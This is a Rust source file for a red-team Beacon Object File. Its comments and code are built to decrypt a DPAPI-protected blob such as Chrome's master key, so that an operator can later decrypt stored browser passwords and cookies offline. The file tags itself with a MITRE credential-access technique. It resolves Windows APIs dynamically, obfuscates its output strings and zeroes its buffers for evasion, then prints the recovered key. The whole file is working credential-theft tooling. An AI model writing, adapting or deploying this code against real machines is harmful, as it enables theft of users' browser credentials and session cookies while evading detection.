// SPDX-FileCopyrightText: 2026 Dani <daniagungg@gmail.com>
// SPDX-License-Identifier: MIT
// Project: DEF-Situational-Awareness-BOF — Dani RustBOF OPSEC Suite
//
//! Decrypt a DPAPI-protected blob (e.g. Chrome master key from Local State).
//! Operator provides the raw encrypted bytes as hex; BOF returns decrypted
//! bytes as hex output. The master key can then be used offline to decrypt
//! cookies/passwords from the SQLite DBs.
//!
//! Args: <encrypted-hex>
//!
//! OPSEC: decrypted key never logged plaintext — output as hex only.
//! Input buffer secure-zeroed after decrypt.

#![no_std]
#![cfg_attr(not(test), no_main)]

use rustbof::{println, eprintln};
use alloc::string::String;
use alloc::vec::Vec;
use common::{mitre::Technique, dfr_fn, obf};

const TECHNIQUES: &[Technique] = &[
    Technique { id: "T1555.003", name: "Credentials from Password Stores: Web Browsers", tactic: "Credential Access" },
];

const CRYPTPROTECT_UI_FORBIDDEN: u32 = 0x1;

#[repr(C)]
struct DataBlob { cb_data: u32, pb_data: *mut u8 }

dfr_fn!(
    crypt_unprotect_data(
        data_in: *const DataBlob, desc: *mut *mut u16, entropy: *const DataBlob,
        reserved: *mut u8, prompt: *const u8, flags: u32, data_out: *mut DataBlob,
    ) -> i32,
    module = "crypt32.dll", api = "CryptUnprotectData"
);

dfr_fn!(
    local_free(mem: *mut u8) -> *mut u8,
    module = "kernel32.dll", api = "LocalFree"
);

fn parse_hex(s: &str) -> Option<Vec<u8>> {
    let mut out = Vec::with_capacity(s.len() / 2);
    let mut hi: Option<u8> = None;
    for c in s.bytes() {
        let v = match c {
            b'0'..=b'9' => c - b'0',
            b'a'..=b'f' => c - b'a' + 10,
            b'A'..=b'F' => c - b'A' + 10,
            b' '|b'\t'|b'\r'|b'\n'|b',' => continue,
            _ => return None,
        };
        match hi { None => hi = Some(v), Some(h) => { out.push((h << 4) | v); hi = None; } }
    }
    if hi.is_some() || out.is_empty() { return None; }
    Some(out)
}

#[rustbof::main]
fn main(args: *mut u8, len: usize) {
    common::mitre::print_banner(env!("CARGO_PKG_NAME"), TECHNIQUES);
    let mut parser = rustbof::data::DataParser::new(args, len);
    match run(&mut parser) {
        Ok(()) => {},
        Err(e) => eprintln!("[!] {}: {}", env!("CARGO_PKG_NAME"), e),
    }
}

fn run(parser: &mut rustbof::data::DataParser) -> Result<(), &'static str> {
    let hex_s = String::from(parser.get_str());
    let hex_s = hex_s.as_str();
    if hex_s.is_empty() { return Err("usage: global-unprotect <encrypted-hex>"); }

    let mut enc = parse_hex(hex_s).ok_or("invalid hex")?;

    let data_in = DataBlob { cb_data: enc.len() as u32, pb_data: enc.as_mut_ptr() };
    let mut data_out = DataBlob { cb_data: 0, pb_data: core::ptr::null_mut() };

    let rc = unsafe {
        crypt_unprotect_data(
            &data_in, core::ptr::null_mut(), core::ptr::null(),
            core::ptr::null_mut(), core::ptr::null(),
            CRYPTPROTECT_UI_FORBIDDEN, &mut data_out,
        )
    }.map_err(|_| "CryptUnprotectData resolve")?;

    // Zero the input blob immediately
    common::evasion::secure_zero(&mut enc);

    if rc == 0 || data_out.pb_data.is_null() {
        return Err("CryptUnprotectData failed (wrong user context?)");
    }

    // Output decrypted bytes as hex
    let dec_len = data_out.cb_data as usize;
    let dec_slice = unsafe { core::slice::from_raw_parts(data_out.pb_data, dec_len) };

    obf! { let label = "decrypted"; }
    println!("[+] {} ({} bytes):", label, dec_len);
    // Print hex in 32-byte lines
    let mut i = 0usize;
    while i < dec_len {
        let end = (i + 32).min(dec_len);
        let mut line = [0u8; 96]; // max 32*3
        let mut n = 0;
        for &b in &dec_slice[i..end] {
            const HEX: &[u8] = b"0123456789abcdef";
            line[n] = HEX[(b >> 4) as usize]; n += 1;
            line[n] = HEX[(b & 0xf) as usize]; n += 1;
            line[n] = b' '; n += 1;
        }
        let s = core::str::from_utf8(&line[..n]).unwrap_or("");
        println!("  {}", s);
        i = end;
    }

    // Free the output buffer allocated by DPAPI
    unsafe { let _ = local_free(data_out.pb_data); };
    Ok(())
}
